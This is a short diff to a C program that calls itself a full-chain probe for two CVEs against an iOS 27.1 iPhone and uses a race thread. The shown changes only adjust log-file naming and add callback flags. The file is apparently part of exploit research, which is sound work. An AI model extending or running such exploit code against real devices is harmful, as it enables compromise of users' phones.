@@ -72,6 +72,8 @@ static volatile OSStatus g_cb_status = -999;
 static volatile int g_cb_count = 0;
 static volatile size_t g_last_pset_count = 0;
 static volatile size_t g_last_pset_total_bytes = 0;
+static volatile int g_cb_had_buf = 0;
+static volatile int g_cb_had_fmt = 0;
 static CMFormatDescriptionRef g_saved_fmt = NULL; /* retained fmt desc from last callback */
 
 static void rlog(const char *fmt, ...) {
@@ -907,9 +909,15 @@ static void *race_thread_fn(void *arg) {
 
 int main(int argc, char *argv[]) {
     char logpath[512];
-    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_full_chain.txt",
-             getenv("HOME") ? getenv("HOME") : "/tmp");
+    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_%d.txt",
+             getenv("HOME") ? getenv("HOME") : "/tmp", getpid());
     g_log = fopen(logpath, "w");
+    /* Also write to fixed name for backward compat */
+    char logpath2[512];
+    snprintf(logpath2, sizeof(logpath2), "%s/Documents/ave_full_chain.txt",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    FILE *f2 = fopen(logpath2, "w");
+    if (f2) fclose(f2); /* truncate old */
 
     rlog("=== CVE-2026-114025 + CVE-2026-112465 Full Chain Probe ===\n");
     rlog("Target: iPhone Duo (A20 Pro, iOS 27.1)\n");
